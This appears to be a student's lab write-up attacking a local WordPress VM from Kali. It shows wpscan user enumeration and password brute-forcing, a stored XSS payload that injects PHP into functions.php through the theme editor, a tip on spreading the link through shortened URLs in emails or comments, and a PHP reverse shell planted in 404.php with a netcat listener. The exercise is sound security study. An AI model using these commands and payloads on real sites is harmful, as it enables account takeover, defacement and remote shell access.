# WordPressvsKali
Exploit 1: User Enumeration

In this exploit, I launched a user enumeration attack on WPDistillery.vm

1. Open a terminal in Kali
2. Access wpscan tool
3. Input the command
  - sudo wpscan --url http://wpdistillery.vm -e u rockyou.txt
  - Note: -e = enumeration, u = user, and I used rockyou.txt as the userlist.
  
  ![image](https://user-images.githubusercontent.com/111927957/198867624-89719a11-b1f8-4dac-9ea2-abc15ae25f50.png)
  
  The results of the user enumeration scan:
  
  ![image](https://user-images.githubusercontent.com/111927957/198867668-cf89a4a8-8283-4ad0-8e65-b0676c2a8c3c.png)
  
  The enumeration scan identified "admin" as an available user.
  
  This can be checked by attempting to login as Admin on wpdistillery.vm/wp-login.php
  
  ![image](https://user-images.githubusercontent.com/111927957/198867726-35f6a92c-34ed-4111-be9f-97624dd0da9b.png)
  
  The results show that "The password you entered for the username admin is incorrect". This proves that admin is a user on this website. 
  
  Next, I will bruteforce into admin using wpscan.
  
  1. Continuing on the same terminal, insert the command: 
    - sudo wpscan --url http://wpdistillery.vm/wp-login.php -U 'admin' -P fasttrack.txt
    - Note: I'm using fasttrack.txt wordlist to bruteforce into admin.
  ![image](https://user-images.githubusercontent.com/111927957/198867852-f8efa7d9-37e8-4bf9-aee1-a6349979a3dc.png)
  
  ![image](https://user-images.githubusercontent.com/111927957/198867860-d9372c27-a756-4ffc-9b8a-43e7f6f55b2d.png)
  
  Results of the wpscan shows that user "admin" has the password "admin".

  Now we are able to log in as admin and access the website.
  
  Exploit 2: XSS
  
  In this exploit, I will show a method to launch a XSS attack. 
  
  1. As admin, add this script as a new post in the text tab then publish:
     - <script>eval(window.location.hash.substring(1))</script>
     - This makes the website vulnerable to XSS
     - To confirm that it works, go back to the mainpage wpdistillery.vm then add /#alert(1)
     - An alert box should pop up, showing (1)
     ![image](https://user-images.githubusercontent.com/111927957/198874401-26b38a41-6bc0-444d-a1bb-e3b1a6b4c81b.png)
     
   2. Go to theme editor > file functions.php
   3. Insert the following code to break the page:
   -nc=document.querySelector('#newcontent');nc.value='<?php echo "HACK THE PLANET";phpinfo();exit()?>'+nc.value;nc.form.submit.click()
   
   4. Refresh the page the add this to the end of the URL:
   #i=document.createElement('iframe');document.body.appendChild(i);i.src='/wp-admin/theme-editor.php?      file=functions.php';window.setTimeout(function(){nc=i.contentDocument.querySelector('#newcontent');nc.value='<?php echo "HACK THE PLANET";phpinfo();exit()?>'+nc.value;nc.form.submit.click()},3000)
  
   5. Users now won't have access to the website.

![image](https://user-images.githubusercontent.com/111927957/198875062-37c59997-b311-4f63-a008-697fabf3d330.png)

  6. Use a URL shortener to deliver and send this attack as an email or even a comment that the user would read/click on.

Exploit 3: Privilege Escalation

  This exploit will show privilege escalation on WPDistillery.vm
  
  1. Using user enumeration as previously shown, the attacker can use leverage this skill by finding a user available for attack.
  2. Once the user is able to log in using an authenticated user, the attacker can now attempt to escalate the privilege by opening a reverse shell.
  3. This can be done by using 404.php template on WordPress and inserting a reverse shell implementation php.
      ![image](https://user-images.githubusercontent.com/111927957/198873488-db0d3e67-f8bd-49fc-af98-b69be130547a.png).
      
  4. The reverse shell php file can be found in usr/share/webshells
    ![image](https://imgur.com/MiJ6IKF.gif)
      
  5. Make sure to change the IP and Port configuration on the reverse shell php to the correct IP and listening Port so          NetCat can listen to the specified port and access the shell.
  
  6. Use the following command to listen on the specified port:
     - nc -lvp 443
   
  7. If successful, the user should be inside the console.
  8. This can be confirmed by using whoami command in the console. 




  

